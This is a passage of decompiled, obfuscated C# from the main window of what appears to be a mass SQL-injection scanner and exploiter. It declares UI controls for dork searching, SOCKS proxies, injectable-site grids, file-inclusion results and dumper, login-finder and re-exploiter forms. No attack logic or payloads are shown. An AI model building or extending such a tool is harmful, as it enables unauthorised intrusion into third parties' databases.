	[AccessedThroughProperty("btnXmlImport8x")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _btnXmlImport8x;

	[CompilerGenerated]
	[AccessedThroughProperty("chkSearchColumn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _chkSearchColumn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("chkSearchColumn2")]
	[CompilerGenerated]
	private ToolStripButton _chkSearchColumn2;

	[AccessedThroughProperty("cmbSearchColumn2")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripComboBox _cmbSearchColumn2;

	[AccessedThroughProperty("chkSearchColumn3")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _chkSearchColumn3;

	[CompilerGenerated]
	[AccessedThroughProperty("chkSearchColumn4")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _chkSearchColumn4;

	[AccessedThroughProperty("mnuQueueAddURLs")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuQueueAddURLs;

	[AccessedThroughProperty("ID")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn_0;

	[AccessedThroughProperty("mnuLWReExploiter")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuLWReExploiter;

	[AccessedThroughProperty("cmbSQLiFilter")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripComboBox _cmbSQLiFilter;

	[AccessedThroughProperty("cmbSQLiNoInjectableFilter")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripComboBox _cmbSQLiNoInjectableFilter;

	[AccessedThroughProperty("cmbFileInclusaoFilter")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripComboBox _cmbFileInclusaoFilter;

	[AccessedThroughProperty("mnuAboutHWID")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuAboutHWID;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("btnSearchFilter")]
	private ToolStripButton _btnSearchFilter;

	[CompilerGenerated]
	[AccessedThroughProperty("dtgQueue")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DataGridView _dtgQueue;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("dtgTrash")]
	private DataGridView _dtgTrash;

	[AccessedThroughProperty("btnSocksUrl")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnSocksUrl;

	[AccessedThroughProperty("dtgSQLi")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DataGridView _dtgSQLi;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("dtgFileInclusao")]
	private DataGridView _dtgFileInclusao;

	[AccessedThroughProperty("dtgSQLiNoInjectable")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DataGridView _dtgSQLiNoInjectable;

	[CompilerGenerated]
	[AccessedThroughProperty("dtgSocks")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DataGridView _dtgSocks;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("imlTree")]
	private ImageList imageList_1;

	[AccessedThroughProperty("cmbGuiStyle")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ComboBox _cmbGuiStyle;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("chkHideDork")]
	private ToolStripButton _chkHideDork;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("lblIP")]
	private ToolStripStatusLabel _lblIP;

	private ThreadPool threadPool_0;

	private Dictionary<Globals.SearchHost, SearchEngine> dictionary_0;

	private List<string> list_0;

	private Enum6 enum6_0;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private string string_0;

	private int int_4;

	private List<string> list_1;

	private bool bool_0;

	public AppDomainControl AppControlDomain;

	public Dumper DumperForm;

	public LoginFinder LoginFinderForm;

	public Analizer AnalizerForm;

	public ReExploiter ReExploiterForm;

	private static bool bool_1;

	public static byte[] DLL_HTTP;

	internal bool bool_2;

	internal bool bool_3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static string string_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static string string_2;

	private Dictionary<string, Delegate> dictionary_1;

	private static string string_3 = "";

	private string string_4;

	private static int int_5;

	private static int int_6;

	private static int int_7;

	private static int int_8;

	private static int int_9;

	private static int int_10;

	private static int int_11;

	private static int int_12;

	private static int int_13;

	private Struct10 struct10_0;

	private CheckSearchType checkSearchType_0;

	private SearchColumn searchColumn_0;

	private List<DataGridViewRow> list_2;

	internal TreeNode treeNode_0;

	internal TreeNode treeNode_1;

	internal TreeNode treeNode_2;

	internal TreeNode treeNode_3;

	internal TreeNode treeNode_4;

	internal TreeNode treeNode_5;

	internal TreeNode treeNode_6;

	internal TreeNode treeNode_7;

	internal TreeNode treeNode_8;

	internal TreeNode treeNode_9;

	internal TreeNode treeNode_10;

	internal TreeNode treeNode_11;

	internal TreeNode treeNode_12;

	internal TreeNode treeNode_13;

	internal TreeNode treeNode_14;

	internal TreeNode treeNode_15;

	internal ToolStripLabel toolStripLabel_1;

	internal ToolStripButton toolStripButton_3;

	internal ToolStripButton toolStripButton_4;

	private System.Timers.Timer timer_0;

	private System.Timers.Timer timer_1;

	private UxTabControl uxTabControl_0;

	private UxTabControl uxTabControl_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mdiTabControl")]
	private TabControlExt tabControlExt_0;

	private ScrollingBox scrollingBox_0;

	private bool bool_4;

	private Stopwatch stopwatch_0;

	[SpecialName]
	private bool _0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024Main_FormClosing_002420211C128375_0024IsCalled_0024Init;

	[SpecialName]
	private bool _0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init;

	[SpecialName]
	private bool _0024STATIC_0024bcWorker_ProgressChanged_002420211C12832D_0024IsLoaded;

	[SpecialName]
	private Dictionary<string, List<string>> _0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS_0024Init;

	[SpecialName]
	private Dictionary<string, List<string>> _0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init;

	[SpecialName]
	private int _0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init;

	[SpecialName]
	private int _0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called_tricks_0024Init;

	[SpecialName]
	private bool _0024STATIC_0024HandleTimerBackground_002420211C12819D_0024called;

	[SpecialName]
	private byte _0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init;

	[SpecialName]
	private int _0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init;

	[SpecialName]
	private int _0024STATIC_0024AddLog_0024202AEE_0024iCount;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init;

	[SpecialName]
	private int _0024STATIC_0024AddLog_0024202AEE_0024iSkiped;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init;

	[field: AccessedThroughProperty("stMain")]
	internal virtual StatusStrip stMain
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblMainStatus")]
	internal virtual ToolStripStatusLabel lblMainStatus
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TreeViewExt twMain
	{
		[CompilerGenerated]
		get
		{
			return _twMain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			TreeNodeMouseClickEventHandler value2 = method_53;
			TreeViewCancelEventHandler value3 = method_106;
			TreeViewExt treeViewExt = _twMain;
			if (treeViewExt != null)
			{
				treeViewExt.NodeMouseClick -= value2;
				treeViewExt.BeforeSelect -= value3;
			}
			_twMain = value;
			treeViewExt = _twMain;
			if (treeViewExt != null)
			{
				treeViewExt.NodeMouseClick += value2;
				treeViewExt.BeforeSelect += value3;
			}
		}
	}

	internal virtual ToolStrip tslNotepad
	{
		[CompilerGenerated]
		get
		{
			return toolStrip_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolStrip_0 = value;
		}
	}

	internal virtual ToolStripButton btnNotepadOpen
	{
		[CompilerGenerated]
		get
		{
			return toolStripButton_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolStripButton_0 = value;
		}
	}

	internal virtual ToolStripSeparator toolStripSeparator5
	{
		[CompilerGenerated]
		get
		{
			return toolStripSeparator_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolStripSeparator_0 = value;
		}
	}

	internal virtual ToolStripButton btnNotepadSave
	{
		[CompilerGenerated]
		get
		{
			return toolStripButton_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolStripButton_1 = value;
		}
	}

	internal virtual ToolStripSeparator toolStripSeparator7
	{
		[CompilerGenerated]
		get
		{
			return toolStripSeparator_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolStripSeparator_1 = value;
		}
	}

	internal virtual ToolStripButton btnNotepadClear
	{
		[CompilerGenerated]
		get
		{
			return toolStripButton_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolStripButton_2 = value;
		}
	}

	internal virtual ToolStripLabel ToolStripLabel3
	{
		[CompilerGenerated]
		get
		{
			return toolStripLabel_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolStripLabel_0 = value;
		}
	}

	[field: AccessedThroughProperty("pnlAbout")]
	internal virtual Panel pnlAbout
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlSockList")]
	internal virtual Panel pnlSockList
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlSettings")]
	internal virtual Panel pnlSettings
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblHTTPtimeout")]
	internal virtual Label lblHTTPtimeout
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblHTTPretry")]
	internal virtual Label lblHTTPretry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ContextMenuStrip mnuListView
	{
		[CompilerGenerated]
		get
		{
			return _mnuChecked;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_158;
			ContextMenuStrip mnuChecked = _mnuChecked;
			if (mnuChecked != null)
			{
				mnuChecked.Opening -= value2;
			}
			_mnuChecked = value;
			mnuChecked = _mnuChecked;
			if (mnuChecked != null)
			{
				mnuChecked.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLWClipboard
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWClipboard;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_161;
			ToolStripMenuItem toolStripMenuItem = _mnuLWClipboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWClipboard = value;
			toolStripMenuItem = _mnuLWClipboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLWSelectAll
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWSelectAll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_162;
			ToolStripMenuItem toolStripMenuItem = _mnuLWSelectAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWSelectAll = value;
			toolStripMenuItem = _mnuLWSelectAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLWExport
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWExport;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_167;
			ToolStripMenuItem toolStripMenuItem = _mnuLWExport;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWExport = value;
			toolStripMenuItem = _mnuLWExport;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuLWSelectAllSP")]
	internal virtual ToolStripSeparator mnuLWSelectAllSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuLWRemove
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWRemove;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_169;
			ToolStripMenuItem toolStripMenuItem = _mnuLWRemove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWRemove = value;
			toolStripMenuItem = _mnuLWRemove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ImageList imgData
	{
		[CompilerGenerated]
		get
		{
			return imageList_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			imageList_0 = value;
		}
	}

	internal virtual BackgroundWorker bcWorker
	{
		[CompilerGenerated]
		get
		{
			return backgroundWorker_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			ProgressChangedEventHandler value2 = method_27;
			RunWorkerCompletedEventHandler value3 = method_28;
			BackgroundWorker backgroundWorker = backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.ProgressChanged -= value2;
				backgroundWorker.RunWorkerCompleted -= value3;
			}
			backgroundWorker_0 = value;
			backgroundWorker = backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.ProgressChanged += value2;
				backgroundWorker.RunWorkerCompleted += value3;
			}
		}
	}

	[field: AccessedThroughProperty("tsSocks")]
	internal virtual ToolStrip tsSocks
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSocksAppend
	{
		[CompilerGenerated]
		get
		{
			return _btnSocksAppend;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_200;
			ToolStripButton toolStripButton = _btnSocksAppend;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSocksAppend = value;
			toolStripButton = _btnSocksAppend;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator15")]
	internal virtual ToolStripSeparator ToolStripSeparator15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSocksClear
	{
		[CompilerGenerated]
		get
		{
			return _btnSocksClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_199;
			ToolStripButton toolStripButton = _btnSocksClear;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSocksClear = value;
			toolStripButton = _btnSocksClear;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripLabel9")]
	internal virtual ToolStripLabel ToolStripLabel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSocksTest
	{
		[CompilerGenerated]
		get
		{
			return _btnSocksTest;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_198;
			ToolStripButton toolStripButton = _btnSocksTest;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSocksTest = value;
			toolStripButton = _btnSocksTest;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator16")]
	internal virtual ToolStripSeparator ToolStripSeparator16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSocksNew
	{
		[CompilerGenerated]
		get
		{
			return _btnSocksNew;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_197;
			ToolStripButton toolStripButton = _btnSocksNew;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSocksNew = value;
			toolStripButton = _btnSocksNew;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ContextMenuStrip mnuSocks
	{
		[CompilerGenerated]
		get
		{
			return _mnuChecked_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_192;
			ContextMenuStrip mnuChecked_ = _mnuChecked_1;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			_mnuChecked_1 = value;
			mnuChecked_ = _mnuChecked_1;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuSocksSelectAll
	{
		[CompilerGenerated]
		get
		{
			return _mnuSocksSelectAll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_193;
			ToolStripMenuItem toolStripMenuItem = _mnuSocksSelectAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSocksSelectAll = value;
			toolStripMenuItem = _mnuSocksSelectAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem5")]
	internal virtual ToolStripSeparator ToolStripMenuItem5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuSocksRemove
	{
		[CompilerGenerated]
		get
		{
			return _mnuSocksRemove;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_194;
			ToolStripMenuItem toolStripMenuItem = _mnuSocksRemove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSocksRemove = value;
			toolStripMenuItem = _mnuSocksRemove;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuSocksCheck
	{
		[CompilerGenerated]
		get
		{
			return _mnuSocksCheck;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_195;
			ToolStripMenuItem toolStripMenuItem = _mnuSocksCheck;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSocksCheck = value;
			toolStripMenuItem = _mnuSocksCheck;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuSocksUnCheck
	{
		[CompilerGenerated]
		get
		{
			return _mnuSocksUnCheck;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_196;
			ToolStripMenuItem toolStripMenuItem = _mnuSocksUnCheck;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSocksUnCheck = value;
			toolStripMenuItem = _mnuSocksUnCheck;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuLWRemoveSP")]
	internal virtual ToolStripSeparator mnuLWRemoveSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual CheckBox chkSkin
	{
		[CompilerGenerated]
		get
		{
			return _chkSkin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_123;
			CheckBox checkBox = _chkSkin;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkSkin = value;
			checkBox = _chkSkin;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	internal virtual ComboBox cmbSkin
	{
		[CompilerGenerated]
		get
		{
			return _cmbSkin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_122;
			ComboBox comboBox = _cmbSkin;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged -= value2;
			}
			_cmbSkin = value;
			comboBox = _cmbSkin;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual Button btnSkinN
	{
		[CompilerGenerated]
		get
		{
			return _btnSkinN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_121;
			Button button = _btnSkinN;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnSkinN = value;
			button = _btnSkinN;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button btnSkinP
	{
		[CompilerGenerated]
		get
		{
			return _btnSkinP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			Button button = _btnSkinP;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnSkinP = value;
			button = _btnSkinP;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("pnlNotepad")]
	internal virtual Panel pnlNotepad
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuAbout")]
	internal virtual ContextMenuStrip mnuAbout
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuAboutClipboard
	{
		[CompilerGenerated]
		get
		{
			return _mnuAboutClipboard;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_118;
			ToolStripMenuItem toolStripMenuItem = _mnuAboutClipboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuAboutClipboard = value;
			toolStripMenuItem = _mnuAboutClipboard;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("pnlScanner")]
	internal virtual Panel pnlScanner
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlExploiter")]
	internal virtual Panel pnlExploiter
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlTrash")]
	internal virtual Panel pnlTrash
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbDorks")]
	internal virtual GroupBox grbDorks
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtMultiDorks
	{
		[CompilerGenerated]
		get
		{
			return _txtMultiDorks;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_34;
			EventHandler value3 = method_35;
			TextBox textBox = _txtMultiDorks;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
				textBox.Leave -= value3;
			}
			_txtMultiDorks = value;
			textBox = _txtMultiDorks;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
				textBox.Leave += value3;
			}
		}
	}

	internal virtual CheckedListBox lstSearchEngine
	{
		[CompilerGenerated]
		get
		{
			return _lstSearchEngine;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_33;
			ItemCheckEventHandler value3 = method_107;
			CheckedListBox checkedListBox = _lstSearchEngine;
			if (checkedListBox != null)
			{
				checkedListBox.Leave -= value2;
				checkedListBox.ItemCheck -= value3;
			}
			_lstSearchEngine = value;
			checkedListBox = _lstSearchEngine;
			if (checkedListBox != null)
			{
				checkedListBox.Leave += value2;
				checkedListBox.ItemCheck += value3;
			}
		}
	}

	[field: AccessedThroughProperty("grbScannerURL")]
	internal virtual GroupBox grbScannerURL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlWindows")]
	internal virtual Panel pnlWindows
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlControls")]
	internal virtual Panel pnlControls
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbHttpLog")]
	internal virtual Panel grbHttpLog
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ContextMenuStrip mnuHttpLog
	{
		[CompilerGenerated]
		get
		{
			return _mnuChecked_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_209;
			ContextMenuStrip mnuChecked_ = _mnuChecked_6;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			_mnuChecked_6 = value;
			mnuChecked_ = _mnuChecked_6;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuHttpLogClear
	{
		[CompilerGenerated]
		get
		{
			return _mnuHttpLogClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_204;
			ToolStripMenuItem toolStripMenuItem = _mnuHttpLogClear;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuHttpLogClear = value;
			toolStripMenuItem = _mnuHttpLogClear;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator4")]
	internal virtual ToolStripSeparator ToolStripSeparator4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuHttpLogAutoScroll
	{
		[CompilerGenerated]
		get
		{
			return _mnuHttpLogAutoScroll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_205;
			ToolStripMenuItem toolStripMenuItem = _mnuHttpLogAutoScroll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.CheckedChanged -= value2;
			}
			_mnuHttpLogAutoScroll = value;
			toolStripMenuItem = _mnuHttpLogAutoScroll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.CheckedChanged += value2;
			}
		}
	}

	internal virtual TextBox txtExcludeUrlWords
	{
		[CompilerGenerated]
		get
		{
			return _txtExcludeUrlWords;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_115;
			TextBox textBox = _txtExcludeUrlWords;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_txtExcludeUrlWords = value;
			textBox = _txtExcludeUrlWords;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblHTTPdelayIP")]
	internal virtual Label lblHTTPdelayIP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

